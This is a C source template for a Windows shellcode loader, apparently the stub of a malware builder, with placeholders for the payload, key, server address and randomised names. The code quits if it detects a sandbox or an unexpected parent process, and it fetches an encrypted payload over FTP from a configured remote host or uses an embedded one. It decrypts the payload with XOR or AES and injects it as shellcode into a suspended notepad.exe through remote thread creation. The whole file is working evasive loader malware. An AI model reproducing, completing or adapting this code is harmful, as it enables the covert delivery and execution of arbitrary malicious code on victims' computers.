#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <bcrypt.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "psapi.lib")

// Forward declarations
int DL();
void decrypt_payload(unsigned char *data, size_t data_len);
void inject_into_process(unsigned char *sc, size_t sc_size);

unsigned char payload[] = { {{PAYLOAD_ARRAY}} };
size_t payload_len = {{PAYLOAD_SIZE}};
char key[] = {{KEY}};
char enc_algo[] = {{ENC_ALGO}};
char payload_type[] = {{PAYLOAD_TYPE}};
char FTP_USER[] = "{{FTP_USER}}";
char FTP_PASS[] = "{{FTP_PASS}}";

wchar_t PROTOCOL[10];
wchar_t IP[50];
short PORT;
wchar_t PATH[100];

unsigned char *{{BUF_NAME}} = NULL;
size_t {{SIZE_NAME}} = 0;
int {{CAPACITY_NAME}} = 0;

// {{JUNK}}

int is_sandbox_user() {
    char username[256] = {0};
    DWORD size = sizeof(username);
    GetUserNameA(username, &size);
    return (strstr(username, "sandbox") || strstr(username, "admin") || strstr(username, "test")) ? 1 : 0;
}

int check_parent() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    DWORD ppid = 0, mypid = GetCurrentProcessId();
    if (Process32First(hSnap, &pe32)) {
        do {
            if (pe32.th32ProcessID == mypid) {
                ppid = pe32.th32ParentProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ppid);
    CHAR parentName[MAX_PATH] = "";
    if (hParent) {
        HMODULE hMod;
        DWORD cbNeeded;
        if (EnumProcessModules(hParent, &hMod, sizeof(hMod), &cbNeeded))
            GetModuleBaseNameA(hParent, hMod, parentName, sizeof(parentName));
        CloseHandle(hParent);
    }
    return _stricmp(parentName, "explorer.exe") != 0;
}

void decrypt_payload(unsigned char *data, size_t data_len) {
    if (strcmp(enc_algo, "xor") == 0) {
        for (size_t i = 0; i < data_len; i++)
            data[i] ^= key[i % strlen(key)];
    } else if (strcmp(enc_algo, "aes") == 0) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        DWORD cbKeyObj = 0, cbData = 0;
        PUCHAR pbKeyObj = NULL;
        UCHAR rgbIV[16] = {0};
        UCHAR keyMaterial[16] = {0};
        memcpy(keyMaterial, key, min(strlen(key), 16));

        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) return;
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) return;
        if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj, sizeof(DWORD), &cbData, 0)) return;
        pbKeyObj = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);
        if (!pbKeyObj) return;
        if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObj, cbKeyObj, keyMaterial, 16, 0)) return;

        ULONG outLen = 0;
        if (BCryptDecrypt(hKey, data, (ULONG)data_len, NULL, rgbIV, 16, data, (ULONG)data_len, &outLen, 0)) return;

        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
        if (pbKeyObj) HeapFree(GetProcessHeap(), 0, pbKeyObj);
    }
}

int DL() {
    HMODULE hWinInet = LoadLibraryA("wininet.dll");
    if (!hWinInet) return 0;

    typedef HINTERNET(WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
    typedef HINTERNET(WINAPI *pInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
    typedef HINTERNET(WINAPI *pFtpOpenFileA)(HINTERNET, LPCSTR, DWORD, DWORD, DWORD_PTR);
    typedef BOOL(WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL(WINAPI *pInternetCloseHandle)(HINTERNET);

    pInternetOpenA InternetOpenA_ = (pInternetOpenA)GetProcAddress(hWinInet, "InternetOpenA");
    pInternetConnectA InternetConnectA_ = (pInternetConnectA)GetProcAddress(hWinInet, "InternetConnectA");
    pFtpOpenFileA FtpOpenFileA_ = (pFtpOpenFileA)GetProcAddress(hWinInet, "FtpOpenFileA");
    pInternetReadFile InternetReadFile_ = (pInternetReadFile)GetProcAddress(hWinInet, "InternetReadFile");
    pInternetCloseHandle InternetCloseHandle_ = (pInternetCloseHandle)GetProcAddress(hWinInet, "InternetCloseHandle");

    char ipA[100], pathA[100];
    wcstombs(ipA, IP, sizeof(ipA));
    wcstombs(pathA, PATH, sizeof(pathA));

    HINTERNET hInternet = InternetOpenA_("MyFTPStub/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 0;

    HINTERNET hFtp = InternetConnectA_(hInternet, ipA, INTERNET_DEFAULT_FTP_PORT, FTP_USER, FTP_PASS, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    if (!hFtp) { InternetCloseHandle_(hInternet); return 0; }

    HINTERNET hFile = FtpOpenFileA_(hFtp, pathA, GENERIC_READ, FTP_TRANSFER_TYPE_BINARY, 0);
    if (!hFile) { InternetCloseHandle_(hFtp); InternetCloseHandle_(hInternet); return 0; }

    unsigned char tempBuf[4096]; DWORD bytesRead = 0;
    {{SIZE_NAME}} = {{CAPACITY_NAME}} = 0;

    while (InternetReadFile_(hFile, tempBuf, sizeof(tempBuf), &bytesRead) && bytesRead > 0) {
        if ({{SIZE_NAME}} + bytesRead > {{CAPACITY_NAME}}) {
            {{CAPACITY_NAME}} = ({{CAPACITY_NAME}} == 0) ? 8192 : {{CAPACITY_NAME}} * 2;
            {{BUF_NAME}} = (unsigned char*)realloc({{BUF_NAME}}, {{CAPACITY_NAME}});
            if (!{{BUF_NAME}}) { InternetCloseHandle_(hFile); InternetCloseHandle_(hFtp); InternetCloseHandle_(hInternet); return 0; }
        }
        memcpy({{BUF_NAME}} + {{SIZE_NAME}}, tempBuf, bytesRead);
        {{SIZE_NAME}} += bytesRead;
    }

    InternetCloseHandle_(hFile); InternetCloseHandle_(hFtp); InternetCloseHandle_(hInternet);
    return 1;
}

void inject_into_process(unsigned char *sc, size_t sc_size) {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return;

    LPVOID remote_mem = VirtualAllocEx(pi.hProcess, NULL, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_mem) { TerminateProcess(pi.hProcess, 1); return; }

    if (!WriteProcessMemory(pi.hProcess, remote_mem, sc, sc_size, NULL)) { TerminateProcess(pi.hProcess, 1); return; }

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
    if (!hThread) { TerminateProcess(pi.hProcess, 1); return; }

    ResumeThread(pi.hThread);

    CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

int main() {
    if (is_sandbox_user() || check_parent()) return -1;

    wcscpy(PROTOCOL, L"{{PROTOCOL}}");
    wcscpy(IP, L"{{IP}}");
    PORT = {{PORT}};
    wcscpy(PATH, L"{{PATH}}");

    unsigned char *final_payload = NULL;
    size_t final_size = 0;

    if (wcslen(IP) > 0) {
        if (!DL()) return -1;
        final_payload = {{BUF_NAME}};
        final_size = {{SIZE_NAME}};
    } else {
        final_payload = payload;
        final_size = payload_len;
    }

    decrypt_payload(final_payload, final_size);

    if (!strcmp(payload_type, "shellcode")) {
        inject_into_process(final_payload, final_size);
    }

    return 0;
}
